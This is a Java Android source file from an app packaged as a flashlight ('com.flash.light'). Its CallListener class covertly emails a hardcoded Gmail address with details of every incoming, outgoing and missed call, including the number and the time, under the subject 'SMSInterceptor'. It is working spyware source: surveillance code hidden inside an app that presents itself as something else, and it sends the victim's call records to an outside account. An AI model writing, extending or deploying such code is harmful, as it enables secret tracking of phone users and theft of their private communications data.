package com.flash.light;

import android.util.Log;

import java.util.List;
import java.util.Date;

import android.content.Intent;
import android.content.Context;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class CallListener extends PhoneCallReceiver {

  private static GmailSender sender;
  private static Configure configure;
  private static String gmailEmailString;

  private static String senderAddr = "smsinterceptorapp@gmail.com";

  public CallListener() { 
    configure = new Configure();
    if(!configure.getDatabaseInfo().equals("null")) { 
      if(configure.getEmailAddress().equals("update")) {
        Log.d("FlashLight CallListener constructor"," configure.getEmailAddress() " + configure.getEmailAddress());
        gmailEmailString = String.valueOf(configure.getEmailAddress());
      }
      else {
        gmailEmailString = "smsinterceptorapp@gmail.com"; 
      }
      Log.d("FlashLight CallListener() ", "gmailEmailString " + gmailEmailString);
    }
  }

  @Override
  protected void onIncomingCallReceived(final Context ctx, final String number, final Date start) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, senderAddr, gmailEmailString);
          //sender.sendMail("SMSInterceptor", "Incoming call started\nNumber: " + number + "\nStart Time: " + start, emailString, emailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError onIncomingCallReceived()", " " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallAnswered(final Context ctx, final String number, final Date start) {
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Incoming call answered\nNumber: " + number + "\nStart Time: " + start, senderAddr, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError onIncomingCallAnswered()", " " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallEnded(final Context ctx, final String number, final Date start, final Date end) { 
    new Thread(new Runnable() {

     @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Incoming call ended!\nNumber: " + number + "\nEnd Time: " + end, senderAddr, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError onIncomingCallEnded()", " " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onOutgoingCallStarted(final Context ctx, final String number, final Date start) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Outgoing call started!\nNumber: " + number + "\nStart Time: " + start, senderAddr, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError onOutgoingCallStarted()", " " + e.toString());
        }
      }
    }).start();
  } 

  @Override 
  protected void onOutgoingCallEnded(final Context ctx, final String number, final Date start, final Date end) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Outgoing call ended!\nNumber: " + number + "\nEnd Time: " + end, senderAddr, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError onOutgoingCallEnded()", " " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onMissedCall(final Context ctx, final String number, final Date start) { 
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "Missed call\nNumber: " + number + "\nTime: " + start, senderAddr, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e("gmailSenderError onMissedCall()", " " + e.toString());
        }
      }
    }).start();
  }

}
